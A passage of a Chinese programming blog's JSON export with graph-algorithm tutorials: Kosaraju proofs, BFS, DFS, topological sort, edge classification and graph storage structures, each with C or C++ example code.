因为在原图的转置中对u搜索可以访问到v，因此一定存在一条从u到v的路径，也就是在原图中存在一条从v到u的路径，这意味着：在原图中，顶点u是顶点v的后裔。 证明在原图的转置中也存在从v到u的路径（也就是原图中存在一条从u到v的路径）：因为DFS（u）可以访问到v，所以“不严格拓扑序列”的逆序（S的弹栈）中，顶点u在顶点v之前，也就是在“不严格拓扑序列”中，顶点v出现在顶点u之前。这等价于：在原图中，或者1.顶点u在顶点v之前加入了DFS的堆栈（d[u] &lt; d[v]），而顶点v先完成，并弹出到了“不严格拓扑序列”当中，顶点u在完成对其所有可到达邻接顶点的扫描后弹出到“不严格拓扑序列”中，或者2.顶点u在顶点v扫描完成后才加入DFS的堆栈（d[v] &lt; d[u]）。因为原图中顶点v比顶点u先完成DFS，根据上一篇文章中有关的深度优先搜索的性质和条件1，原图的DFS过程中f[v] &lt; f[u]，这里根据1和2可能出现两种情况（根据括号定理，要么不相交，要么包含）：1. d[u] &lt; d[v] &lt; f[v] &lt; f[u]，2. d[v] &lt; f[v] &lt; d[u] &lt; f[u]。根据括号定理和条件1，如果是第二种情况，v和u的区间互不相交，而原图中u是v的后裔，矛盾，所以只能是第一种情况。根据后裔区间嵌套定理，此时原图中v是u的后裔，证毕。 证明2：所有强连通子图都会被搜索到。这等价于推翻存在一对顶点（u，v）可互相到达，但不属于同一个强连通子图的情况。通过反证法：假设存在这样的（u，v），显然经过DFS后，其中一个点一定在另一个点拓展出的搜索树中。根据对称性，假设v在u拓展出的搜索树中，则在DFS过程中，v会在u之前弹出系统栈。假设命题不成立，就必须有一棵搜索树包含了v且不包含u，假设这棵搜索树的根是s：如果s比u先出栈，根据括号定理只能有d[s] &lt; d[v] &lt; f[v] &lt; f[s] &lt; d[u] &lt; f[u]或者d[u] &lt; d[s] &lt; f[s] &lt; f[u]，后者显然意味着s是u的后裔，而前者会在访问v的时候搜索到顶点u，因此s只能比u后出栈，即d[u] &lt; f[u] &lt; d[s] &lt; f[s]或者d[s] &lt; d[u] &lt; f[u] &lt; f[s]。后者显然意味着u是s的后裔，而前者因为（u，v）由已知可以互达，则从u拓展出的搜索树会在s之前搜索到v。综上，假设不成立，命题成立。 优势：按照Kosaraju算法求出来的强连通子图虽然比Tarjan稍慢，但得到的强连通子图是拓扑顺序的，因为对原图转置的DFS是按照不严格拓扑序列的逆序进行的，注意这里关系的转化。 代码 邻接表（C语言） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define WHITE 0#define GRAY 1#define BLACK 2struct Node &#123; int v; struct Node * next;&#125;;typedef struct Node node;void insert( node ** graph, int u, int v )&#123; node * temp = ( node * )malloc( sizeof( node ) ); temp-&gt;v = v; temp-&gt;next = graph[u]; graph[u] = temp;&#125;int V, E, time;int * vis, * list;int * S, top;void Dfs_Visit( node ** graph, int u )&#123; printf( \"%d \", u ); vis[u] = GRAY; node * temp = graph[u]; while ( temp != NULL )&#123; if ( vis[temp-&gt;v] == WHITE ) Dfs_Visit( graph, temp-&gt;v ); temp = temp-&gt;next; &#125; vis[u] = BLACK; S[top++] = u;&#125;void Dfs( node ** graph )&#123; int i; top = 0; for ( i = 1; i &lt;= V ; i++ ) vis[i] = 0; for ( i = 1 ; i &lt;= V ; i++ ) if ( vis[ list[i] ] == WHITE )&#123; Dfs_Visit( graph, list[i] ); putchar('\\n'); &#125;&#125;void init()&#123; vis = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); S = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); list = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); int i; for ( i = 1 ; i &lt;= V ; i++ ) list[i] = i;&#125;int main()&#123; int i, u, v; scanf( \"%d %d\", &amp;V, &amp;E ); node ** graph1 = ( node ** )malloc( sizeof( node * ) * ( V + 1 ) ); node ** graph2 = ( node ** )malloc( sizeof( node * ) * ( V + 1 ) ); for ( i = 1; i &lt;= V ; i++ ) graph1[i] = NULL; for ( i = 1; i &lt;= V ; i++ ) graph2[i] = NULL; init(); for ( i = 0 ; i &lt; E ; i++ )&#123; scanf( \"%d %d\", &amp;u, &amp;v ); insert( graph1, u, v ); insert( graph2, v, u ); &#125; Dfs( graph1 ); for ( i = 1 ; i &lt;= V ; i++ ) list[i] = S[--top]; printf( \"Ans :\\n\" ); Dfs( graph2 ); return 0;&#125; 运行结果 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/19/Graph-Algorithms3/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"图的遍历和拓扑排序","slug":"Graph-Algorithms2","date":"2015-09-13T14:19:47.000Z","updated":"2016-11-04T15:44:14.000Z","comments":true,"path":"2015/09/13/Graph-Algorithms2/","link":"","permalink":"http://forec.github.io/2015/09/13/Graph-Algorithms2/","excerpt":"图的搜索算法、拓扑排序和边的分类。","text":"图的搜索算法、拓扑排序和边的分类。 摘要 图的搜索算法 广度优先搜索 深度优先搜索 拓扑排序 基于DFS Kahn 边的分类 图的搜索算法 图的搜索（此处以遍历为例）指从图中任一顶点出发，对图中所有所有顶点访问一次且只访问一次，是图的基本操作。 广度优先搜索（BFS) 广度优先搜索（BFS）是最简单的图搜索算法之一，在Prim最小生成树和Dijkstra单源最短路径中都采用了广度优先的思想。 在给定图G=（V，E）的情况下和某个特定的源点s时，BFS首先从s出发，寻找到图中所有s可到达的顶点（可以同时计算s到这些顶点之间的距离，生成一颗根为s，包括所有s可达顶点的广度优先树）。BFS的特点是沿着已发现顶点和未发现顶点之间的边界向外拓展，也就是说，BFS最先搜索到与s距离为k的所有顶点，在这步操作完成之后，再以这些距离s为k的顶点为基础向外拓展，寻找与s距离为k+1的其他顶点。为了区分已寻找到的顶点和未寻找到的顶点，需要对顶点着色，通常设置一个vis/used数组，boolean类型记录是否访问过。开始时全部为false（白色），在BFS的过程中逐渐染色为true（非白色）。有时为了区分顶点u的相邻顶点是否全部发现，可以对u着灰色或黑色予以区分：灰色表示顶点u可能与一些白色顶点相邻，黑色表示u的相邻顶点全部都是黑色。 整个BFS使用一个队列，开始时将源点s入队，标记s为已访问（used[s] = true），之后每次队首元素u出队，并遍历与u直接相连的顶点v，判断used[v]，如果没有访问则标记v为已访问，并将v入队，整个过程直至队列为空结束。下面这张图展示了BFS过程中队列变化的情况，图片来源于网络。 代码实现（以有向图邻接表为例，最后输入的是搜索开始的源点） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;struct Node &#123; int v; struct Node * next;&#125;;const int INF = 0x7fffffff;typedef struct Node node;int V, E;void insert( node ** graph, int u, int v )&#123; node * temp = ( node * ) malloc ( sizeof ( node ) ); temp-&gt;v = v; temp-&gt;next = graph[u]; graph[u] = temp;&#125;int * visit, * dist, * pre;void BFS( node ** graph, int s )&#123; visit = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); dist = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); pre = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); int i; for ( i = 1 ; i &lt;= V ; i++ )&#123; visit[i] = 0; dist[i] = INF; pre[i] = 0; &#125; visit[s] = 1; dist[s] = 0; int * Q = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); int front = 0, rear = 0; Q[front++] = s; while ( rear != front )&#123; int u = Q[rear++]; node * temp = graph[u]; while ( temp != NULL )&#123; if ( !visit[temp-&gt;v] )&#123; visit[temp-&gt;v] = 1; dist[temp-&gt;v] = dist[u] + 1; pre[temp-&gt;v] = u; Q[front++] = temp-&gt;v; &#125; temp = temp-&gt;next; &#125; printf( \"%d \", u ); &#125; putchar('\\n');&#125;int main()&#123; scanf( \"%d %d\", &amp;V, &amp;E ); int i, u, v, s; node ** graph = ( node ** ) malloc ( sizeof ( node * ) * ( V + 1 ) ); for ( i = 0 ; i &lt; E ; i++ )&#123; scanf( \"%d %d\", &amp;u, &amp;v ); insert( graph, u , v ); &#125; scanf( \"%d\", &amp;s ); BFS( graph, s ); return 0;&#125; 上面程序的运行结果依赖于输入的源点。在大多数情况下，广度优先搜索从某个源顶点开始，而不会从多个源顶点开始搜索，例如寻找最短路径距离。而深度优先搜索则多从多个源顶点开始搜索，作为另一个算法的一个子程序。 深度优先搜索（DFS） 与广度优先搜索不同的是，DFS的先辈子图可以由几棵树组成，因为搜索有可能从多个源点开始重复进行。深度优先搜索的先辈子图形成了一个由数棵深度优先树组成的深度优先森林。 在搜索过程中，通过对顶点的着色表示顶点的状态。开始时每个顶点都为白色，搜索中发现后即置为黑色（或发现时置为灰色，结束时置为黑色），保证深度优先树互不相交。 对于最新发现的顶点，如果它还有以自身为起点并且没有检测过的边，就沿此边继续探测。当某个顶点v的所有边都已经被探寻过，搜索会回溯到v顶点以上的某些仍有未探测边的顶点，直到从源顶点可到达的所有顶点都被探测过，此时查看染色数组，如果仍存在未访问顶点，则选择未访问顶点中的一个作为源点，重复以上过程，直到所有顶点被发现。 除了创建深度优先森林外，深度优先搜索同时为每个顶点加盖时间戳（许多图的算法中都用到了时间戳，有助于推算深度优先搜索的进行情况。例如后面的Tarjan）。每个顶点v都有两个时间戳：当v被第一次发现时，记录第一个时间戳d[v]，当对v所有可到达顶点检查结束时，为v盖第二个时间戳f[v]。 整个DFS执行过程：初始化将所有顶点染白，pre[]域置空，之后依次检索V中的顶点，发现白色顶点u即调用DFS_Visit(u)开始访问，每次通过DFS_Visit(u)调用时，顶点u就成为了深度优先森林中一棵新树的根。DFS的结果可能会依赖于顶点访问的顺序（下面代码中有相应解释）。下图是DFS整个过程的示意图，图片来自算法导论。 代码实现（有向图邻接表，采取三染色） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#define WHITE 0#define GRAY 1#define BLACK 2struct Node &#123; int v; struct Node * next;&#125;;const int INF = 0x7fffffff;typedef struct Node node;int V, E;void insert( node ** graph, int u, int v )&#123; node * temp = ( node * ) malloc ( sizeof ( node ) ); temp-&gt;v = v; temp-&gt;next = graph[u]; graph[u] = temp;&#125;int * visit, * pre;int * d, * f, time;void DFS_Visit( node ** graph, int u )&#123; printf( \"%d \", u ); visit[u] = GRAY; d[u] = ++time; node * temp = graph[u]; while ( temp != NULL )&#123; if ( visit[temp-&gt;v] == WHITE )&#123; pre[temp-&gt;v] = u; DFS_Visit( graph, temp-&gt;v); &#125; temp = temp-&gt;next; &#125; visit[u] = BLACK; f[u] = ++time;&#125;void DFS( node ** graph )&#123; visit = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); pre= ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); d= ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); f= ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); int u; memset( visit, 0, sizeof( int ) * ( V + 1 ) ); memset( pre, 0, sizeof( int ) * ( V + 1 ) ); time = 0; for ( u = V ; u &gt;= 1 ; u-- ) if ( visit[u] == WHITE ) DFS_Visit( graph, u ); putchar('\\n');&#125;int main()&#123; scanf( \"%d %d\", &amp;V, &amp;E ); int i, u, v, s; node ** graph = ( node ** ) malloc ( sizeof ( node * ) * ( V + 1 ) ); for ( i = 0 ; i &lt; E ; i++ )&#123; scanf( \"%d %d\", &amp;u, &amp;v ); insert( graph, u , v ); &#125; DFS( graph ); printf(\"u\\td[u]\\tf[u]\\tpre[u]\\n\"); for ( i = 1 ; i &lt;= V ; i++ ) printf ( \"%d\\t%d\\t%d\\t%d\\n\", i, d[i], f[i], pre[i] ); return 0;&#125; 下面两张图分别是代码中注释掉的for循环（从1到V）和未注释的for循环（从V到1）的执行结果。可以看出，最终搜索的顺序依赖于两个for循环的顺序，当然也依赖于DFS_Visit(u)中对u相邻顶点的访问次序。实践中，这些不同的顺序往往不会引起问题，因为任何DFS的搜索结果都可以被有效利用，最终结果基本上等价。 给出一些深度优先搜索的性质 括号定理：在对一个图（有向或无向）G =（V，E）的任何DFS中，对于图中任意两个顶点u和v，以下三条仅有一条成立：1.区间[d[u], f[u]]和区间[d[v], f[v]]是完全不相交的，并且在深度优先森林中，u或v都不是对方的后裔。2.区间[d[u], f[u]]完全包含于区间[d[v], f[v]]中，且在深度优先树当中，u是v的后裔。3.区间[d[v], f[v]]完全包含于区间[d[u], f[u]]中，且在深度优先树当中，v是u的后裔。 后裔区间嵌套：在一个图（有向或无向）G的深度优先森林中，顶点v是顶点u的后裔，当且仅当d[u] &lt; d[v] &lt; f[v] &lt; f[u]。 白色路径定理：在一个图（有向或无向）G的深度优先森林中，顶点v是顶点u的后裔，当且仅当在搜索过程中处于时刻d[u]发现u时，可以从顶点u出发，经过一条完全由白色顶点组成的路径到达v。上面定理的证明都很简单。可以作为判定的技巧使用。 拓扑排序 对一个有向无回路图（dag）G=（V，E）进行拓扑排序后，结果为该图所有顶点的一个线性序列，这个序列满足：如果G包含边（u，v），则在这个序列中，u出现在v的前面（如果图G是有回路的，就不可能有这样的序列）。在很多应用中，有向无回路图用于说明事件发生的先后顺序，如早上起床穿衣的过程：必须先穿好袜子才能穿鞋，其他的一些衣服则可以按任意顺序穿戴（上衣和裤子）。 基于DFS 基于DFS：我们在DFS中为每个顶点加盖了时间戳，其中一个f[u]代表着将所有u的可到达顶点扫描完成时的时间。以穿戴为例，可以构造一个有向图，（袜子，鞋）为一条有向边，代表着二者之间的先后顺序：先穿完袜子才可以穿鞋，所以鞋必须在袜子遍历完成之后才能结束遍历，也就是f[鞋] &gt; f[袜子]。因此将DFS完成后的各个顶点按照f[]升序排序，得到的序列即为拓扑序列。当然，拓扑序列显然不是唯一的，可以先穿上衣再穿裤子也可以先穿裤子再穿上衣，这取决于DFS对顶点访问的顺序。 代码实现 12345678910111213141516void DFS_Visit( node ** graph, int u )&#123; printf( \"%d \", u ); visit[u] = GRAY; d[u] = ++time; node * temp = graph[u]; while ( temp != NULL )&#123; if ( visit[temp-&gt;v] == WHITE )&#123; pre[temp-&gt;v] = u; DFS_Visit( graph, temp-&gt;v); &#125; temp = temp-&gt;next; &#125; visit[u] = BLACK; f[u] = ++time; // add u to L &#125; 只要在DFS_Visit()函数中最后将u添加到拓扑序列L中就可以。 Kahn Kahn算法：首先设置拓扑序列为列表L，初始化为空，统计图中每个顶点的入度，将所有入度为0的点组成一个集合S，当S不为空，就从S中取出一个点u，将其加入L的表尾，并将所有与u直接相连的有向边（u，v）删去，并将每个v的入度减一，如果某个v因此入度变为了0，则将v加入S。如此循环往复，直到S为空。此时如果图中仍有边没被删去，则说明图中至少含有一个回路，否则L就是生成的一个拓扑序列。 代码实现（有向图邻接表） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;list&gt;#include &lt;queue&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;memory.h&gt;using namespace std;struct Node &#123; int v; struct Node * next;&#125;;const int INF = 0x7fffffff;typedef struct Node node;int V, E;void insert( node ** graph, int u, int v )&#123; node * temp = ( node * ) malloc ( sizeof ( node ) ); temp-&gt;v = v; temp-&gt;next = graph[u]; graph[u] = temp;&#125;void Topological( node ** graph, int * indegree )&#123; queue&lt;int&gt; S; list&lt;int&gt; L; for ( int i = 1; i &lt;= V ; i++ )&#123; if ( !indegree[i] ) S.push(i); &#125; while ( !S.empty() )&#123; int u = S.front(); S.pop(); L.push_back(u); node * temp = graph[u]; while ( temp != NULL )&#123; E--; if ( !--indegree[temp-&gt;v] ) S.push(temp-&gt;v); temp = temp-&gt;next; &#125; &#125; if ( E != 0 ) cout &lt;&lt; \"G has Circuit\"; else for ( list&lt;int&gt;::iterator i = L.begin() ; i != L.end() ; ++i ) cout &lt;&lt; *i &lt;&lt; \" \"; cout &lt;&lt; endl;&#125;int main()&#123; int u, v; cin &gt;&gt; V &gt;&gt; E; int * Indegree = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); node ** graph = ( node ** )malloc( sizeof( node * ) * ( V + 1 ) ); memset( Indegree, 0, sizeof( int ) * ( V + 1 ) ); for ( int i = 0 ; i &lt; E ; i++ )&#123; cin &gt;&gt; u &gt;&gt; v; insert( graph, u, v ); Indegree[v]++; &#125; Topological( graph, Indegree ); return 0;&#125; 以下是运行情况 边的分类 深度优先搜索可以对输入图G =（V，E）的边归类，这种归类可以用来收集很多关于图的重要信息，例如之后会看到这种归类在有向图回路问题中的运用。 归类方法 树边：是深度优先森林中的边，如果顶点v是在探寻边（u，v）时被首次发现的，则（u，v）为一条树边。 反向边：在深度优先树中连接顶点v到达它的某一个祖先顶点u的那些边。有向图中可能出现的自环也被认为是反向边。 正向边：在深度优先树中连接顶点u到它的某一个后裔v的非树边（u，v）。 交叉边：其它类型的边，存在于同一棵深度优先树的两个顶点之间，条件是其中的一个顶点不是另一个顶点的祖先。交叉边也可以在不同的深度优先树的顶点之间。 修改DFS使其可以对边进行分类 在上面DFS代码中，可以通过三染色对边进行归类。核心在于，对于每条边（u，v），当该边第一次被探寻到时，即根据v的颜色来对该边进行分类（对正向边和交叉边不做区分）。 白色：表明（u，v）是一条树边。 灰色：表明（u，v）是一条反向边。 黑色：表明（u，v）是一条正向边或者交叉边。 证明：对第一种情况，白色从定义可知；对第二种情况，灰色顶点对应着DFS_Visit()的调用栈，每次探寻都从最深的灰色顶点开始，所以一旦目标顶点v是灰色，说明v是u的祖先；第三种情况处理其他可能性，并且显而易见：如果d[u] &lt; d[v]，则（u，v）是一条正向边，如果d[u] &gt; d[v]，则（u，v）是一条交叉边。当然，在无向图中，因为（u，v）和（v，u）是一条边，因此这种分类仅适用前两种（白色，灰色）类型，可以证明：对无向图G深度优先搜索，G的每一条边要么是树边，要么是反向边。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/13/Graph-Algorithms2/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"图的概念和存储方式","slug":"Graph-Algorithms1","date":"2015-09-12T05:00:21.000Z","updated":"2017-02-08T08:37:06.000Z","comments":true,"path":"2015/09/12/Graph-Algorithms1/","link":"","permalink":"http://forec.github.io/2015/09/12/Graph-Algorithms1/","excerpt":"图的概念和术语、标准表示方式以及其他存储方式。","text":"图的概念和术语、标准表示方式以及其他存储方式。 摘要 图的概念和术语 标准表示方式 其他存储方式 图的概念和术语 一个图（Graph）是表示物件与物件之间的关系的方法，是图论的基本研究对象。一个图看起来是由一些小圆点（称为顶点或结点）和连结这些圆点的直线或曲线（称为边）组成的。（From Wikipedia） 给定图G=（V，E），其中V代表|V|，指的是图中的顶点数，E代表|E|，指的是图中的边数。通过这两个参数描述一个图的规模。以下均使用二元组的定义方式定义G，对于映射关系复杂的使用三元组G=（V，E，I），I为关联函数，将E中的每个元素映射到V。 基本术语 阶（Order）：图G中V的大小称为G的阶。 子图（Sub-Graph）：图G’称为G的子图，当V(G’)包含于V(G)，并且E(G’)包含于E(G)。 生成子图（Spanning Sub-Graph）：满足V(G’)=V(G)的子图。 度（Degree）：一个顶点的度是指与该顶点相关联的总边数，顶点v的度记作d(v)。在G中：∑d(v) = 2|E|。 出度（Out-Degree）和入度（In-Degree）：有向图中，顶点v的出度是以v为起点的边的数量，入度相反。 自环（Loop）：一条边的起点和终点是同一个顶点。 路径（Path）：从顶点u到顶点v的一条路径是指经过一个边的序列（u，v1），（v1，v2），（v2，v3），……，（vn，v），若u = v则该路径是闭的，否则是开的。若v1，v2，……，v两两不等，则该路径为简单路径，又称轨道（Track）（允许u=v），闭的轨道称为圈（Cycle）。 行迹（Trace）：若路径P（u，v）中各边都不相同则该路径为u到v的一条行迹。闭的行迹称为回路（Circuit）。 距离（Distance）：从u到v的最短路径存在时，该最短路径的长度为从u到v的距离。不存在路径时，距离为∞。 桥（Bridge）：若去掉一条边使得整个图不连通，则该边称为桥。 有向图：图中顶点之间的路径存在方向，A-&gt;B的路径存在不等于B-&gt;A的路径也存在。 无向图：图中顶点之间的路径是双向的。 完全图：若图中每一对不同顶点恰有一条边相连，则称为完全图。完全图是每对顶点之间都恰连有一条边的简单图。无向完全图的边数E=V×(V-1)/2。有向完全图E=V×(V-1)。 连通图和连通分量：在无向图中，若从顶点A到顶点B有路径，则称A和B连通。若图中任意两个顶点之间都连通，则称该图为连通图，否则，称该图为非连通图，其中的极大连通子图称为连通分量（极大指该子图中包含的顶点个数在所有连通子图中极大）。有向图的最大连通子图称为该有向图的强连通分量。任何连通图的连通分量只有一个（其自身）。 团：团是G的一个完全子图，如果一个团不是其他任何一个团的真子集，则该团为G的极大团。顶点最多的极大团是G的最大团。 标准表示方式 概念 表示一个图的标准方法有邻接表和邻接数组，这两种方法都可以同时用于有向图和无向图。通常采用邻接表表示法，它用来存储稀疏图（E远小于V^2）更紧凑。当遇到稠密图或必须很快判断两个顶点间是否存在边时使用邻接数组表示法（如Floyd算法）。 邻接表：G=（V，E）的邻接表由一个包含|V|个列表的数组D组成，每个顶点对应数组中的一个列表。对于顶点u∈V，当存在一条路径u-&gt;v（v∈V），则D[u]中包含v或指向v的指针。邻接表中的顶点可以按任意顺序存储。当G是有向图，邻接表D的长度为E，G是无向图，邻接表D的长度为2E（一条边需要在两个方向存储）。邻接表修改后可以支持多种图的变体，有很强的适应性，但若要确定图中边（u，v）是否存在只能经过线性时间搜索。 邻接数组：在G=（V，E）中，将各个顶点按某种方式编号为1，2，3，……，|V|，之后通过一个|V|×|V|的矩阵A存储，当（u，v）∈E，Auv = 1，否则Auv = 0。若为加权图，则可以用权值和∞代替1和0。这种表示方法在O(1)的时间内得到u，v之间的关系，但需要较大的存储空间。 以下是无向图和有向图使用上述两种方式的表示形式。从上面图可以看出，邻接矩阵A关于主对角线对称，即A = A^T ，在无向图的一些应用中可以只存储主对角线和主对角线以上的部分，减少一半的存储空间。 完整代码 邻接表表示法（无向加权图） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* * @author Forec * Test Adjacency List */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;struct Node&#123; int w; int v; struct Node * next;&#125;;typedef struct Node node;void insert( int u, int v, int weight, node ** List )&#123; node * temp; temp = ( node * )malloc( sizeof( node ) ); temp-&gt;v = v; temp-&gt;w = weight; temp-&gt;next = List[u]; List[u] = temp; // Add node v to the head of list[u] temp = ( node * )malloc( sizeof( node ) ); temp-&gt;v = u; temp-&gt;w = weight; temp-&gt;next = List[v]; List[v] = temp; // Add node u to the head of list[v]&#125;void print( node ** List, int V )&#123; int i; node * temp; for ( i = 1 ; i &lt;= V ; i++ )&#123; printf( \"%d\", i ); temp = List[i]; while ( temp != NULL )&#123; printf( \"-&gt;%d(%d)\", temp-&gt;v, temp-&gt;w ); temp = temp-&gt;next; &#125; putchar('\\n'); &#125;&#125;int main()&#123; int V, E, u, v, w; int i; scanf( \"%d %d\", &amp;V, &amp;E ); node ** Adj = ( node ** )malloc( sizeof( node * ) * ( V + 1 ) ); for ( i = 1 ; i &lt;= V ; i++ ) Adj[i] = NULL; for ( i = 0 ; i &lt; E ; i++ )&#123; scanf( \"%d %d %d\", &amp;u, &amp;v, &amp;w ); insert( u, v, w, Adj ); &#125; print( Adj, V ); return 0;&#125; 邻接矩阵表示法（无向加权图） 123456789101112131415161718192021222324252627282930313233343536373839/* * @author Forec * Test Adjacency Matrix */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define INF 0x7fffint Min( int a, int b )&#123; return a &lt; b ? a : b;&#125;int Max( int a, int b )&#123; return a &gt; b ? a : b;&#125;int main()&#123; int V, E, u, v, w; int i, j; scanf( \"%d %d\", &amp;V, &amp;E ); int ** Mat = ( int ** )malloc( sizeof( int * ) * ( V + 1 ) ); for ( i = 1 ; i &lt;= V ; i++ )&#123; Mat[i] = ( int * )malloc( sizeof( int ) * ( i + 1 ) ); for ( j = 1 ; j &lt; i ; j++ ) Mat[i][j] = INF; Mat[i][i] = 0; &#125; for ( i = 0 ; i &lt; E ; i++ )&#123; scanf( \"%d %d %d\", &amp;u, &amp;v, &amp;w ); Mat[Max( u, v )][Min( u, v )] = w; &#125; for ( i = 1 ; i &lt;= V ; i++ )&#123; for ( j = 1 ; j &lt;= i ; j++ ) printf( \"%d\\t\",Mat[i][j]); putchar('\\n'); &#125; return 0;&#125; 其他存储方式 边集数组 边集数组利用几个一维数组存储图中的所有边。 举例，输入数据： 1 4 1 3 3 2 5 2 1 5 上面输入完成后，边集数组如下12345source11351destination43225容易看出，边集数组只是简单的存储每条边的信息，如果需要存储权值只需要再加上一个域。在边集数组中查找一条边或一个顶点的度都需要扫描整个数组，所以其时间复杂性为O（e）。边集数组适合那些对边依次进行处理的运算，不适合对顶点的运算和对任一条边的运算。 前向星和链式前向星 前向星是特殊的边集数组，把边集数组中的每一条边按照起点排序，如果起点相同就按照终点排序，之后用Len[i]记录以i为起点的边共有多少条，以Head[i]记录这Len[i]条边中第一条在前向星数组的哪个位置。举例，输入数据：1 41 33 25 21 5在上面的输入完成后，对其排序得到编号12345起点11135终点34522此时Len和Head数组分别为HeadLen1132-103414-10551前向星需要先对边集数组排序，用快排需要O（NlogN）复杂度，计数排序也需要O（M）的预处理时间。 链式前向星不需要排序，建立边结构体 12345struct Edge&#123; int next; int to; int weight;&#125; 其中，edge[i].to为第i条边的终点，edge[i].next表示与第i条边同起点的下一边在Edge数组中的位置，edge[i].weight为权值。此外还需要数组head，初始化为-1。head[i]表示以i为起点的第一条边的存储位置，利用链式前向星存储时，head[i]记录的位置是按输入顺序最后一条以i为起点的边所存储的位置。插入边代码如下。 1234567// initialize cnt 0void insert( int u, int v, int w )&#123; edge[cnt].to = v; edge[cnt].weight = w; edge[cnt].next = head[u]; head[u] = cnt++;&#125; 按照上面前向星的例子，插入结束后得到的edge数组如下iedge[i].toedge[i].nextedge[i].whead14-1-head[1] = 0230-head[1] = 132-1-head[3] = 242-1-head[5] = 3551-head[1]= 4遍历时按输入顺序的倒序遍历，for ( int i = head[u] ; i &gt;= 0 ; i = edge[i].next )。 十字链表 对于邻接矩阵，处理稀疏图资源利用效率不高，可以结合邻接表的思想，链式表示稀疏矩阵。当然其应用不局限于矩阵，一切具有正交关系的结构都可以使用十字链表存储。rowcolvaluerightdown以上是十字链表的结构，row和col分别表示当该元素使用邻接矩阵存储时所在的行数和列数。value是元素值（权值），down指向了当用邻接矩阵存储时，同一列中下一个非0元素所在的位置，right指向了当用邻接矩阵存储时，同一行中下一个非0元素所在的位置。每行/列设一个表头结点（结构与元素结点相同），与down/right构成循环链表，即第i列头结点的down指向该列上第1个非0元素，第i行头结点的right指向该行第1个非0元素，第i列/行上最后一个结点的down/right指向该列/行的头结点。如果某列/行中没有非0元素，则令它的头结点down/right域指向自己。可以额外设置一个表头指针数组，指向每行/列的表头节点。 代码实现十字链表的结构和插入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;struct Node&#123; int row, col, value; struct Node *right, *down; &#125;;typedef struct Node OLNode;typedef struct Node * OLink; typedef struct&#123; OLink *rowHead; OLink *colHead; int row, col, len;&#125;CrossList; void CreateCrossList( CrossList * List )&#123; int row, col, len, i, u, v, w; OLink p, q; scanf( \"%d %d %d\", &amp;row, &amp;col, &amp;len ); /* row, col分别为十字链表模拟数组的行数和列数，len为非0元素数目 */ List-&gt;row = row; List-&gt;col = col; List-&gt;len = len; List-&gt;rowHead = ( OLink * )malloc( ( row+1 ) * sizeof( OLink ) ); List-&gt;colHead = ( OLink * )malloc( ( col+1 ) * sizeof( OLink ) ); // 应检查是否overflow for( i = 0; i &lt; row + 1 ; i++ ) List-&gt;rowHead[i] = NULL; for( i = 0; i &lt; col + 1 ; i++ ) List-&gt;colHead[i] = NULL; for( i = 0 ; i &lt; len ; i++ )&#123; scanf( \"%d %d %d \", &amp;u, &amp;v, &amp;w ); p = ( OLink )malloc( sizeof( OLNode ) ); // 实际使用要检查溢出 p-&gt;row = u; p-&gt;col = v; p-&gt;value = w; if ( List-&gt;rowHead[u] == NULL )&#123; List-&gt;rowHead[u] = p; p-&gt;right=NULL; &#125; else&#123; for( q = List-&gt;rowHead[u] ; q-&gt;right != NULL &amp;&amp; q-&gt;right-&gt;col &lt; v ; q = q-&gt;right ); p-&gt;right = q-&gt;right; q-&gt;right = p; &#125; if(List-&gt;colHead[v] == NULL)&#123; List-&gt;colHead[v] = p; p-&gt;down = NULL; &#125; else&#123; for( q = List-&gt;colHead[v] ; q-&gt;down != NULL &amp;&amp; q-&gt;down-&gt;row &lt; u; q = q-&gt;down ); p-&gt;down = q-&gt;down; q-&gt;down = p; &#125; &#125;&#125; 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/12/Graph-Algorithms1/) 